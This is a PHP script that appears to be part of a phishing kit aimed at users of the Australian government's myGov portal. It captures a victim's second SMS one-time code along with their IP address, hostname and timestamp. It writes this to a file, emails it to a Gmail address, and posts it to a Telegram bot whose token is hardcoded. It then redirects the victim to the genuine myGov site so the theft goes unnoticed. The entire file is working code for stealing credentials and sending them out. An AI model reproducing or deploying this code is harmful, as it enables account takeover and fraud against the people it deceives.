<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$msg="|+ sms2()\r\n";
$msg.="==================================================\r\n";
$msg .= "sms 2 :   ".@$_POST["otpanswer"]."\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : ".@$ip."\n";
$msg .= "|date : :   ".gmdate ("Y-n-d")."@".gmdate ("H:i:s")."\n";
$msg .= "|HostName : :   ".@$hostname."\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../nok.txt","a+");fwrite($save,$msg);fclose($save);
$email="cmnkul@gmail.com"; //HERE
$subject="sms2 =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: dr<comms@dioury.casa>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);
file_get_contents('https://api.telegram.org/bot6493750576:AAHlXbCRrtrDeo3VgvelLeWj1fFIFL5HWnU/sendMessage?chat_id=-915905868&text='.urlencode($msg));
header("Location: https://my.gov.au/");
?>